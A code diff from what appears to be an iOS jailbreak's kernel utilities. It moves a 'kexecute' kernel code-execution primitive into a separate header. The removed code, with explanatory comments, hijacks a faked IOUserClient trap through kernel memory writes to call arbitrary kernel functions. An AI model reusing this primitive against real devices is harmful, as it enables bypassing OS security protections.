@@ -2,9 +2,7 @@
 #import "kern_utils.h"
 #import "kmem.h"
 #import "patchfinder64.h"
-
-extern mach_port_t user_client;
-extern uint64_t fake_client;
+#import "kexecute.h"
 
 unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
 unsigned offsetof_task = 0x18;                // proc_t::task
@@ -79,27 +77,6 @@ unsigned offsetof_t_flags = 0x3a0; // task::t_flags
 #define CS_SIGNED         0x20000000  /* process has a signature (may have gone invalid) */
 #define CS_DEV_CODE         0x40000000  /* code is dev signed, cannot be loaded into prod signed code (will go away with rdar://problem/28322552) */
 
-mach_port_t prepare_user_client() {
-  kern_return_t err;
-  mach_port_t user_client;
-  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-  
-  if (service == IO_OBJECT_NULL){
-    printf(" [-] unable to find service\n");
-    exit(EXIT_FAILURE);
-  }
-  
-  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
-  if (err != KERN_SUCCESS){
-    printf(" [-] unable to get user client connection\n");
-    exit(EXIT_FAILURE);
-  }
-  
-  
-  printf("got user client: 0x%x\n", user_client);
-  return user_client;
-}
-
 uint64_t proc_find(int pd, int tries) {
   // TODO use kcall(proc_find) + ZM_FIX_ADDR
   while (tries-- > 0) {
@@ -153,36 +130,6 @@ kexecute(user_client, fake_client, rk64(rk64(dict)+SetObjectWithCharP), dict, s,
 kfree(s, strlen(str)+1); \
             }
 #define OSString_CStringPtr(str) rk64(str+0x10)
-
-bool kexecute_lock = false;
-
-uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-    while (kexecute_lock == true){
-      NSLog(@"Kexecute locked. Waiting for 10ms.");
-      usleep(10000);
-    }
-    kexecute_lock = true;
-
-    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
-    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
-    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
-    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
-    // through like normal.
-    
-    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
-    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
-    // (i'm not actually sure if the switch back is necessary but meh)
-    
-    uint64_t offx20 = rk64(fake_client+0x40);
-    uint64_t offx28 = rk64(fake_client+0x48);
-    wk64(fake_client+0x40, x0);
-    wk64(fake_client+0x48, addr);
-    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-    wk64(fake_client+0x40, offx20);
-    wk64(fake_client+0x48, offx28);
-    kexecute_lock = false;
-    return returnval;
-}
 
 int dumppid(int pd){
   uint64_t proc = proc_find(pd, 3);
